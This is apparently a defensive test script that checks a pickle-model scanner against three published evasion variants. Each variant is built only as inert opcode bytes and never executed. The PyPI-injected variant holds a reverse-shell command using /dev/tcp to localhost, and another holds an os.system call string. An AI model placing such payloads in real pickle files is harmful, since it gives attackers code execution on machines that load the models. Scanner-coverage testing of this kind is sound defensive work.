#!/usr/bin/env python3
"""Reproduction: does pickle_model_scan.py flag the three published ShadowPickle
(arXiv:2607.17503, Pradhan/Nambiar/Soremekun, 2026) evasion variants?

Each variant is built here as an inert pickle OPCODE STREAM (raw bytes) and handed
to the scanner's static analyzer, pickle_model_scan.scan_pickle_bytes, which reads
the opcodes with pickletools.genops. Nothing is ever unpickled, imported, or
executed -- the bytes are only disassembled, exactly as the scanner does in
production. No network, no model is loaded.

Run from the repo root (so `import pickle_model_scan` resolves to the shipped
module): `python shadowpickle_coverage_check.py`. Exit 0 iff the MISS/CATCH table
in SHADOWPICKLE_COVERAGE.md holds. This result was confirmed in a sealed, no-network
sandbox (python:3.12) on 2026-10-22: all three expectations met.

Made with AI, as MV2 of Munim, Inc. Apache-2.0.
"""
import struct
import sys

import pickle_model_scan as pms


def binunicode(s: str) -> bytes:
    b = s.encode("utf-8")
    return b"X" + struct.pack("<I", len(b)) + b


def glob(module: str, name: str) -> bytes:
    # GLOBAL opcode 'c': module and name as two newline-terminated strings.
    return b"c" + module.encode() + b"\n" + name.encode() + b"\n"


PROTO2 = b"\x80\x02"
REDUCE = b"R"
BUILD = b"b"
STOP = b"."


# --- the three ShadowPickle variants as inert opcode streams -----------------

# IV-B1 Overwritten Module: imports a WHITELISTED stdlib name (collections
# .OrderedDict) whose code the attacker has overwritten elsewhere (supply chain).
# The pickle is byte-identical in shape to a legitimate OrderedDict reduce.
OVERWRITTEN = (PROTO2 + glob("collections", "OrderedDict")
               + binunicode("payload") + REDUCE + BUILD + STOP)

# IV-B2 PyPI Injected: imports a legitimate-but-not-blacklisted PyPI library.
PYPI_INJECTED = (PROTO2 + glob("raft", "run")
                 + binunicode("zsh -c 'sh -i >& /dev/tcp/127.0.0.1/4444 0>&1'")
                 + REDUCE + STOP)

# IV-B3 External Modules: imports a module packaged alongside the model.
EXTERNAL = (PROTO2 + glob("external", "dangerous_func")
            + binunicode("import os; os.system('id')") + REDUCE + STOP)


CASES = [
    ("Overwritten (collections.OrderedDict)", OVERWRITTEN, "MISS"),
    ("PyPI Injected (raft.run)", PYPI_INJECTED, "CATCH"),
    ("External Modules (external.dangerous_func)", EXTERNAL, "CATCH"),
]

# A finding at one of these rules means the scanner surfaced the import for review.
FLAGGING_RULES = {"PKL001", "PKL002", "PKL003", "PKL004", "PKL007"}


def main() -> int:
    all_ok = True
    for label, data, expected in CASES:
        findings = pms.scan_pickle_bytes(data, label)
        flagged = [f for f in findings if f.rule in FLAGGING_RULES]
        got = "CATCH" if flagged else "MISS"
        ok = got == expected
        all_ok = all_ok and ok
        print(f"[{'PASS' if ok else 'FAIL'}] {label}: expected {expected}, got {got}")
        for f in findings:
            print(f"    {f.rule} [{f.severity}] {f.title} :: {f.detail[:80]}")
        if not findings:
            print("    (no findings)")
    print("\nRESULT:", "ALL EXPECTATIONS MET" if all_ok else "MISMATCH")
    return 0 if all_ok else 1


if __name__ == "__main__":
    sys.exit(main())
